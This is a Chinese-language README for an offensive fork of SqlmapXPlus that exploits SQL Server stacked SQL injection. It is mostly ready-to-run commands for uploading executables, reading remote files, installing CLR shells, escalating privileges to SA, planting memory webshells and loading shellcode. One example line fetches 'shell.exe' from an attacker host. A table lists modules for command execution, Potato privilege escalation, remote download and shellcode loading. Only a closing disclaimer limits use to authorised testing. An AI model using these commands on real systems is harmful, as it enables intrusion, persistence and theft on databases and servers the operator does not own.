# SqlmapXPlus

[![License](https://img.shields.io/badge/license-GPLv2-blue.svg)](LICENSE)
[![Python](https://img.shields.io/badge/python-3.x-green.svg)](https://www.python.org/)

> 基于 SqlmapXPlus 的 SQL Server 注入增强工具，专注于 MSSQL 数据库的高级利用场景，同时新增 Spark SQL 大数据数据库支持

## 项目说明

本项目是基于 [SqlmapXPlus](https://github.com/co01cat/SqlmapXPlus) 进行二次开发的工具，而 SqlmapXPlus 本身又是基于著名的 [sqlmap](https://sqlmap.org) 项目进行的二次开发。

**开发 lineage：**
```
sqlmap (原版) → SqlmapXPlus (二次开发) → 本项目 (基于 SqlmapXPlus 的再开发)
```

感谢 sqlmap 开发团队和 SqlmapXPlus 作者 co01cat 的杰出工作！

## 目录

- [项目简介](#项目简介)
- [功能特性](#功能特性)
- [安装说明](#安装说明)
- [使用指南](#使用指南)
  - [文件操作](#文件操作)
  - [CLR 利用](#clr-利用)
  - [权限提升](#权限提升)
  - [内存马注入](#内存马注入)
- [参数说明](#参数说明)
- [更新日志](#更新日志)
- [注意事项](#注意事项)
- [免责声明](#免责声明)

## 项目简介

在攻防演练中，SQL Server 数据库堆叠注入仍存在较高的漏洞发现率。然而，实际场景常面临以下限制：

- 🚫 目标不出网
- 🔒 数据库低权限
- 🖥️ 站库分离架构
- 🛡️ 终端防护软件
- 📡 上线困难
- 🔧 权限维持繁琐

**SqlmapXPlus** 基于 Sqlmap 进行二次开发，针对 MSSQL 数据库注入场景增加多种高级利用方式，实现自动化内存马注入、自动化提权、自动化后门用户添加、自动化远程文件下载、自动化 Shellcode 加载等功能。

## 功能特性

### 文件系统操作
| 参数 | 功能描述 |
|------|----------|
| `--xp-upload` | 通过 xp_cmdshell 上传文件 |
| `--ole-upload` | 通过 OLE Automation 上传文件 |
| `--check-file` | 使用 xp_fileexist 检查文件是否存在 |
| `--ole-del` | 通过 OLE 删除文件 |
| `--ole-read` | 通过 OLE 读取文件内容 |
| `--ole-move` | 通过 OLE 移动/重命名文件 |
| `--ole-copy` | 通过 OLE 复制文件 |

### 操作系统控制
| 参数 | 功能描述 |
|------|----------|
| `--enable-clr` | 启用 CLR 功能 |
| `--disable-clr` | 禁用 CLR 功能 |
| `--enable-ole` | 启用 OLE Automation |
| `--check-clr` | 检查数据库中的用户自定义函数 |
| `--del-clr` | 删除用户自定义函数 |
| `--install-clr1` | 安装 CLR 方式一（落地 DLL） |
| `--install-clr2` | 安装 CLR 方式二（数据库直接加载） |
| `--clr-shell` | 进入 CLR Shell 交互模式 |
| `--to-sa` | 当前用户提权至 SA |
| `--sharpshell-upload1` | 通过 xp_cmdshell 上传 HttpListener 内存马 |
| `--sharpshell-upload2` | 通过 OLE 上传 HttpListener 内存马 |

## 安装说明

```bash
# 克隆项目
git clone https://github.com/co01cat/SqlmapXPlus.git

# 进入项目目录
cd SqlmapXPlus

# 安装依赖
pip install -r requirements.txt
```

## 使用指南

### 文件操作

#### 1. 启用 OLE 功能
```bash
python sqlmap.py -r request.txt --enable-ole
```

#### 2. 文件上传
```bash
# 通过 OLE 上传文件
python sqlmap.py -r request.txt --ole-upload /local/file.exe --file-dest "C:\Windows\Temp\file.exe"

# 通过 xp_cmdshell 上传文件
python sqlmap.py -r request.txt --xp-upload /local/file.exe --file-dest "C:\Windows\Temp\file.exe"
```

#### 3. 文件管理
```bash
# 删除文件
python sqlmap.py -r request.txt --ole-del "C:\Windows\Temp\file.exe"

# 读取文件内容
python sqlmap.py -r request.txt --ole-read "C:\Windows\win.ini"

# 移动/重命名文件
python sqlmap.py -r request.txt --ole-move "C:\source.exe" --file-dest "C:\dest.exe"

# 复制文件
python sqlmap.py -r request.txt --ole-copy "C:\source.exe" --file-dest "C:\copy.exe"

# 检查文件是否存在
python sqlmap.py -r request.txt --check-file "C:\Windows\Temp\file.exe"
```

### CLR 利用

#### 1. 启用 CLR 功能
```bash
python sqlmap.py -r request.txt --enable-clr
```

#### 2. 安装 CLR
```bash
# 方式一：落地 DLL 后加载（适合网络不稳定场景）
python sqlmap.py -r request.txt --install-clr1

# 方式二：直接写入数据库加载（无需落地文件）
python sqlmap.py -r request.txt --install-clr2
```

> **自定义 CLR**：安装时支持指定自定义 DLL 路径，根据提示输入类名和方法名。

#### 3. CLR Shell 交互
```bash
# 进入 CLR Shell 模式
python sqlmap.py -r request.txt --clr-shell

# 在 Shell 中执行自定义函数
> ClrExec "whoami"
> ClrDownload "http://attacker.com/shell.exe" "C:\shell.exe"
```

#### 4. CLR 管理
```bash
# 检查已安装的 CLR 函数
python sqlmap.py -r request.txt --check-clr

# 删除 CLR 函数
python sqlmap.py -r request.txt --del-clr

# 禁用 CLR
python sqlmap.py -r request.txt --disable-clr
```

### 权限提升

```bash
# 将当前数据库用户提权至 SA
python sqlmap.py -r request.txt --to-sa
```

### 内存马注入

```bash
# 方式一：通过 xp_cmdshell 上传 HttpListener 内存马
# 默认路径：C:\Windows\tasks\listen.tmp.txt
# 需要 SYSTEM 权限运行
python sqlmap.py -r request.txt --sharpshell-upload1

# 方式二：通过 OLE 上传 HttpListener 内存马
python sqlmap.py -r request.txt --sharpshell-upload2
```

## 参数说明

### 文件操作参数

| 参数 | 简写 | 说明 | 示例 |
|------|------|------|------|
| `--ole-upload` | - | 本地文件路径 | `--ole-upload /tmp/shell.exe` |
| `--file-dest` | - | 远程目标路径 | `--file-dest "C:\shell.exe"` |
| `--ole-del` | - | 要删除的远程文件 | `--ole-del "C:\old.exe"` |
| `--ole-read` | - | 要读取的远程文件 | `--ole-read "C:\1.txt"` |
| `--ole-move` | - | 源文件路径 | `--ole-move "C:\a.exe"` |
| `--ole-copy` | - | 源文件路径 | `--ole-copy "C:\a.exe"` |

### CLR DLL 说明

项目内置以下功能 DLL：

| DLL 文件 | 类名 | 方法名 | 功能 |
|----------|------|--------|------|
| `clrexec.dll` | Xplus | ClrExec | 命令执行 |
| `clrefspotato.dll` | Xplus | ClrEfsPotato | Potato 提权 |
| `clrdownload.dll` | Xplus | ClrDownload | 远程文件下载 |
| `clrshellcodeloader.dll` | Xplus | ClrShellcodeLoader | Shellcode 加载 |

> **注意**：存储过程函数名区分大小写。

## 更新日志

### 2025-03-06
- ✅ 新增 Spark SQL 数据库支持
  - 支持数据库指纹识别
  - 支持数据库、表、列枚举
  - 支持数据提取（盲注和联合查询）
  - 支持用户枚举
  - ⚠️ **注意**：Spark SQL 功能未经过实战检验，谨慎使用，可能会有问题

### 2025-01-21
- ✅ 更新工具交互方式
- ✅ 优化 CLR 注入利用方式
- ✅ 新增 CLR 落地加载功能（需落地 DLL）
- ✅ 新增一键数据库 CLR 加载功能（无需落地 DLL）
- ✅ 新增 `--check-file` 选项检查文件落地状态
- ✅ 新增 `--check-clr` 选项检查 CLR 加载状态
- ✅ 支持自定义 CLR 类名和方法名

## 注意事项

1. **文件大小限制**：OLE 上传文件大小限制约为 20KB，因十六进制编码会导致文件体积增大一倍。

2. **编码问题**：URL 编码可能影响注入利用成功率，建议根据实际情况调整。

3. **检测准确性**：`--check-file` 和 `--check-clr` 选项存在判断不准确的情况，仅供参考。

4. **权限要求**：
   - 内存马注入需要 SYSTEM 权限
   - CLR 功能需要数据库管理员权限
   - 部分功能需要开启 xp_cmdshell 或 OLE Automation

5. **网络环境**：DLL 传输过程中可能出现数据损失，建议优先使用 `--install-clr2` 方式。

6. **Spark SQL 支持限制**：
   - ⚠️ **实验性功能**：Spark SQL 支持未经过实战检验，谨慎使用
   - 不支持文件系统读写（Spark SQL 无文件操作功能）
   - 不支持系统命令执行（无 xp_cmdshell 等类似功能）
   - 不支持密码哈希提取
   - 不支持权限提升功能
   - 仅支持基本的数据库枚举和数据提取功能

## 免责声明

本工具仅供安全研究和授权测试使用，严禁用于非法用途。使用本工具进行未授权测试所造成的任何后果由使用者自行承担。

---

**项目地址**: [https://github.com/co01cat/SqlmapXPlus](https://github.com/co01cat/SqlmapXPlus)

**作者**: co01cat
